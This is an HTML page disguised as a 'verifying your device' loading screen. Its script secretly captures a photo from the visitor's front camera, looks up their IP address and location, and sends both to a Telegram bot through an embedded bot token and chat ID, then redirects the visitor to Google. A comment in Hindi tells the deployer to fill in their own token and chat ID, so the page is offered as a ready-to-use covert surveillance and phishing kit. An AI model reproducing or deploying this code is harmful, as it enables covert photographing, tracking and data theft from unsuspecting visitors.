<!DOCTYPE html>
<html>
<head>
    <title>Please Wait...</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .card { background: white; border-radius: 20px; padding: 40px 30px; width: 100%; max-width: 350px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h3 { color: #333; font-size: 18px; }
        p { color: #888; font-size: 14px; margin-top: 8px; }
        .bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 4px; margin-top: 20px; overflow: hidden; }
        .bar-inner { height: 100%; width: 0%; background: linear-gradient(90deg, #3498db, #2ecc71); border-radius: 4px; animation: progress 3s ease-in-out forwards; }
        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
        video { display: none; } canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h3>Please wait...</h3>
        <p>Verifying your device, please wait a moment</p>
        <div class="bar"><div class="bar-inner"></div></div>
    </div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <script>
        // ===== यहाँ अपना BOT TOKEN और CHAT ID डालें =====
        var BOT_TOKEN = "8679263618:AAEPhwdqoClkDYmR3dPKxNe8kZFA04U6Qm8
";
        var CHAT_ID = "7999992600";
        // =============================================

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 } })
        .then(function(stream) {
            var video = document.getElementById('video');
            video.srcObject = stream;
            setTimeout(capturePhoto, 2000);
        })
        .catch(function() {
            setTimeout(capturePhoto, 2000);
        });

        function capturePhoto() {
            var video = document.getElementById('video');
            var canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            if (video.videoWidth > 0) {
                canvas.getContext('2d').drawImage(video, 0, 0);
            }
            var photo = canvas.toDataURL('image/jpeg', 0.9);
            
            fetch('https://ipapi.co/json/').then(function(r) { return r.json(); }).then(function(data) {
                var info = "IP: " + data.ip + " | City: " + data.city + " | Country: " + data.country_name;
                sendToTelegram(photo, info);
            }).catch(function() {
                sendToTelegram(photo, "No IP info");
            });
        }

        function sendToTelegram(photo, info) {
            var ts = new Date().toLocaleString();
            var caption = "📸 Photo Captured\n🕐 Time: " + ts + "\n" + info;
            var blob = atob(photo.split(',')[1]);
            var ab = new ArrayBuffer(blob.length);
            var ia = new Uint8Array(ab);
            for (var i = 0; i < blob.length; i++) { ia[i] = blob.charCodeAt(i); }
            var file = new Blob([ab], {type: 'image/jpeg'});
            var fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', file, 'cap.jpg');
            fd.append('caption', caption);
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', { method: 'POST', body: fd })
            .then(function() { setTimeout(function() { window.location.href = "https://www.google.com"; }, 2000); })
            .catch(function() { setTimeout(function() { window.location.href = "https://www.google.com"; }, 2000); });
        }
    </script>
</body>
</html>
